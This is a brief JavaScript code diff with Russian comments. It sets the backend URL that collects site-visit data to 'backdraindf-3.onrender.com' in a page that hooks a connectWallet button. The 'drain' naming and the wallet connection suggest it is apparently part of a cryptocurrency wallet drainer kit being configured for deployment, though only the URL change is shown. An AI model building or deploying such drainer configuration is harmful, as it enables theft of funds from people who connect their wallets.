@@ -5,7 +5,7 @@ let userAccount;
 
 // --- Функции для отправки данных на Python бэкенд ---
 // URL бэкенда (ЗАМЕНИ НА СВОЙ URL RENDER)
-const BACKEND_URL = 'https://drain-monitor-python-YOURNAME.onrender.com'; // <<--- ВАЖНО: Заменить!
+const BACKEND_URL = 'https://backdraindf-3.onrender.com'; // <<--- ВАЖНО: Заменить!
 
 /**
  * Отправка данных о посещении сайта
@@ -625,3 +625,4 @@ window.addEventListener('DOMContentLoaded', () => {
         connectButton.addEventListener('click', connectWallet);
     }
 });
+
